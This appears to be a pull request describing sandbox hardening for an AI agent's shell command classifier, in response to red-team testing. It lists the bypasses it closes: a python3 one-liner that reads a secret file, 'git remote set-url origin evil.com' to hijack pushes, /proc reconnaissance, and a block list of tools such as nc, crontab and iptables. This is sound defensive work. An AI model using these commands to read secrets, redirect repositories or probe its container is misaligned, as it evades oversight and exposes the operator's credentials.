# PR: Red Team Analysis Response (Sandbox Hardening)

**Intent:** FIX
**Goal Lens:** Close critical shell sandbox escape and exfiltration vectors discovered during advanced Red Team testing.

## Summary

This PR fortifies `src/fa/sandbox/classifier.py` and `src/fa/sandbox/secret_paths.py` against six specific bypass vectors documented in `red_team_tasks_v2.md` and `red_team_tasks.md`, including Python string obfuscation, Git config poisoning, infrastructure interference, and process/mount enumeration.

## Changes

1. **Python Shell Wrapper / String Obfuscation Bypass (`secret_paths.py`)**:
   - *Vulnerability:* The secret path protection previously relied solely on `shlex` token prefix matching. Commands like `python3 -c "print(open('/run/secrets/fa.env').read())"` successfully hid the secret path deep inside a single quoted argument, bypassing prefix checks.
   - *Fix:* Implemented a deterministic fail-closed fallback inside `command_reads_secret_path`. Even if lexical tokenization succeeds, a raw substring search for any secret prefix across the entire command string is enforced.

2. **Git Config Poisoning (`classifier.py`)**:
   - *Vulnerability:* The `remote` subcommand was previously absent from `_GIT_WRITE_SUBCOMMANDS`, classifying `git remote set-url origin evil.com` as `READ_ONLY` and executing without an approved draft.
   - *Fix:* Promoted `remote` to a write subcommand, ensuring push-stealing is correctly trapped by `IntentGuard`.

3. **Infrastructure Interference & Persistence (`classifier.py`)**:
   - *Vulnerability:* `systemctl`, `docker`, `iptables`, `crontab`, `mount`, and `nc` defaulted to `GENERAL_WRITE`. While protected by the draft mechanism, these commands present extreme container disruption threats that should never be permitted under normal circumstances.
   - *Fix:* Hardcoded `systemctl`, `docker`, `iptables`, `ifconfig`, `ip`, `mount`, `umount`, `crontab`, `nohup`, `nc`, `netcat`, `ncat` into `_DANGEROUS_TOKENS`.

4. **Container Reconnaissance (`classifier.py`)**:
   - *Vulnerability:* Access to `/proc/1/cmdline` and `/proc/self/mountinfo` allowed agents to silently map the host's entrypoint arguments and underlying topology via `READ_ONLY` `cat` commands.
   - *Fix:* Added a targeted security tripwire inspecting all parsed tokens for `/proc` or `/sys` prefixes. Any reference now escalates the command to `DANGEROUS`.

## Subtraction Evaluated
- Removing what makes this redundant: none.
- What capability is lost: Agent reconnaissance via `/proc` reading; unrestricted Python scripts directly addressing `/run/secrets`. 
- Open-source agent-stack precedent: AppArmor/SELinux profiles typically deny procfs enumerations to untrusted processes; we enforce it deterministically at the AST/sandbox layer.
